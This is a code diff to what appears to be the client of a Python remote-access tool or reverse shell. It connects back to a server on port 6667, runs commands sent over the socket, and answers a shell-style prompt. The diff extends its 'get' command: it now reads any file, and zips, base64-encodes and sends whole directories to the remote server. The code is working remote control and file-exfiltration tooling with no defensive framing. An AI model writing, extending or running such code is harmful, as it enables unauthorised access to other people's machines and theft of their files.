@@ -7,6 +7,23 @@ from os import execv
 from os.path import expanduser, realpath
 from base64 import b64decode, b64encode
 from time import sleep
+import zipfile, zlib
+import shlex
+
+
+def zipdir(path, ziph):
+    """
+    Zip an entire folder.
+
+    :param path:
+    :param ziph:
+    :return:
+    """
+
+    # ziph is zipfile handle
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(path, '..')))
 
 
 class Client(object):
@@ -57,22 +74,37 @@ class Client(object):
         self.sock.send(str.encode(some_data + str(os.getcwd()) + '> ' + '~!_TERM_$~'))
         return self
 
-    def send_data(self, some_data, echo=True, encode=True):
+    def terminate(self):
+        """
+        Send the termination string to the server.
+
+        :return:
+        """
+
+        self.send_data('~!_TERM_$~', terminate=False)
+
+    def send_data(self, some_data, echo=True, encode=True, terminate=True):
         """
         Send data to the server with the termination string appended.
 
         :param some_data:
         :param echo:
+        :param encode:
+        :param terminate:
         :return:
         """
 
         if echo:
             print('Sending Data:', some_data)
+
         if encode:
-            self.sock.send(str.encode(str(some_data + '~!_TERM_$~')))
+            self.sock.send(str.encode(str(some_data)))
         else:
             self.sock.send(some_data)
+
+        if terminate:
             self.sock.send(str.encode('~!_TERM_$~'))
+
         return self
 
     def receive_data(self, echo=False, decode=True):
@@ -325,13 +357,29 @@ class Client(object):
                     # Send the file data back.
                     if data[:4] == 'get ':
                         try:
-                            with open(data[4:].strip(), 'rb') as f:
-                                data = b64encode(f.read())
+                            fp = data[4:].strip()
+                            with open(expanduser(fp), 'rb') as f:
+                                _ = b64encode(f.read())
+                                self.send_data(_, encode=False, terminate=False, echo=False)
+                                del _
                                 f.close()
-                        except FileNotFoundError as err_msg:
-                            self.send_data(str(err_msg))
 
-                        self.send_data(data, encode=False)
+                        except FileNotFoundError as err_msg:
+                            self.send_data(str(err_msg), terminate=False)
+                        except IsADirectoryError as err_msg:
+                            # Zip up the directory and send it over.
+                            zf = zipfile.ZipFile(expanduser(fp) + '.zip', 'w', zipfile.ZIP_DEFLATED)
+                            zipdir(expanduser(fp), zf)
+                            zf.close()
+                            with open(expanduser(fp + '.zip'), 'rb') as f:
+                                _ = b64encode(f.read())
+                                self.send_data(_, encode=False, terminate=False, echo=False)
+                                del _
+                                f.close()
+                                os.remove(expanduser(fp + '.zip'))
+
+                        self.terminate()
+                        del fp
                         continue
 
                     # Handle setting the file upload name.
@@ -376,6 +424,8 @@ class Client(object):
                             p, expurs = None, None
                             del p
                             del expurs
+                        else:
+                            _dir = shlex.split(_dir)[0]
 
                         # Change the directory
                         os.chdir(_dir)
@@ -420,6 +470,7 @@ class Client(object):
 
 if __name__ == '__main__':
     the_host = ''
+    # the_host = '10.0.0.170'
     the_port = 6667
     the_recv_size = 1024
     the_server_shutdown = False
